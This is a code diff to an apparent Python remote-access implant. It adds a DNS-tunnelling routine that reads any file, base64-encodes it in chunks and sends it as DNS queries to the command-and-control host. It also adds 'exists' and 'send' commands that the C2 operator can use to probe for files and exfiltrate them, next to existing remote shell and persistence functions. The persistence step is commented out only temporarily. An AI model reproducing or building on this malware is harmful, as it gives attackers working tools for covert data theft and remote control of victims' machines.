@@ -3,7 +3,8 @@ import ssl
 import subprocess
 import os
 import platform
-from shutil import copyfile
+import struct
+from base64 import b64encode
 
 # Static globals
 SYSTEM = platform.system()
@@ -20,6 +21,93 @@ RestartSec=3
 [Install]
 WantedBy=default.target
 """
+
+
+''' DNS SEND '''
+
+
+def get_file(file_path) -> bytes | None:
+    try:
+        with open(file_path, 'rb') as file:
+            return file.read()
+    except FileNotFoundError:
+        print("File not found")
+        return None
+    except:
+        print("Error while attempting to read file")
+        return None
+
+
+def send_chunk(domain, server, port) -> str:
+    # Create a UDP socket
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.settimeout(5)
+
+    # DNS query header
+    request_id = 1234
+    flags = 0x0100
+    qdcount = 1
+    header = struct.pack('!HHHHHH', request_id, flags, qdcount, 0, 0, 0)
+
+    # DNS question section
+    question = b''
+    domain_parts = domain.split('.')
+    for part in domain_parts:
+        length = len(part)
+        question += struct.pack('!B{}s'.format(length), length, part.encode())
+    question += b'\x00'
+    question_type = 1
+    question_class = 1
+    question += struct.pack('!HH', question_type, question_class)
+
+    # Construct the complete DNS request packet
+    request = header + question
+
+    try:
+        # Send DNS request
+        sock.sendto(request, (server, port))
+
+        # Receive DNS response
+        data, addr = sock.recvfrom(1024)
+
+        # Extract the IP address from the response packet
+        ip_address = socket.inet_ntoa(data[-4:])
+
+        return ip_address
+
+    except socket.timeout:
+        print("DNS request timed out.")
+
+    finally:
+        # Close the socket
+        sock.close()
+
+
+def split_into_chunks(content) -> list[str]:
+    chunks = []
+    domain = ".file"
+    chunk_length = 47-len(domain)
+    for i in range(0, len(content), chunk_length):
+        chunk = content[i:i+chunk_length]
+        chunk = b64encode(chunk).decode()+domain
+        chunks.append(chunk)
+    return chunks
+
+
+def dns_send(file_path) -> bool:
+    content = get_file(file_path)
+    if not content:
+        return False
+
+    chunks = split_into_chunks(content)
+    for chunk in chunks:
+        # Send each chunk in a DNS query
+        answer = send_chunk(chunk, HOST, 5353)
+        if answer == "2.2.2.2":
+            print(f"Failed sending chunk '{chunk}'")
+
+    return True
+
 
 ''' PERSISTENCE '''
 
@@ -140,7 +228,9 @@ def process_instructions(ss: ssl.SSLSocket):
     while True:
         buffer = ss.recv()
         if buffer:
-            match buffer:
+            print(buffer.decode())
+            buffer1 = buffer.split(b" ")[0]
+            match buffer1:
                 case b"ping":
                     ss.send(b"pong")
                 case b"shell":
@@ -148,6 +238,16 @@ def process_instructions(ss: ssl.SSLSocket):
                 case b"persistence":
                     # TODO: return persistence status
                     pass
+                case b"exists":
+                    if os.path.isfile(buffer.split(b" ")[1]):
+                        ss.send(b"ok")
+                    else:
+                        ss.send(b"ko")
+                case b"send":
+                    if dns_send(buffer.split(b" ")[1]):
+                        ss.send(b"ok")
+                    else:
+                        ss.send(b"ko")
                 case _:
                     print(f"Unknown command received: '{buffer.decode()}'")
                     ss.send(b"unknown")
@@ -166,13 +266,13 @@ def main():
         return
     print("Lock is free !")
 
-    # Persistence
-    print("Start persistence...")
-    if platform.system() == "Linux":
-        persistence_linux()
-    elif platform.system() == "Windows":
-        persistence_windows()
-    print("Finished persistence !")
+    # Persistence (TODO: uncomment this before merge)
+    # print("Start persistence...")
+    # if platform.system() == "Linux":
+    #     persistence_linux()
+    # elif platform.system() == "Windows":
+    #     persistence_windows()
+    # print("Finished persistence !")
 
     # Start secure connection with C2
     ss = init_connection()
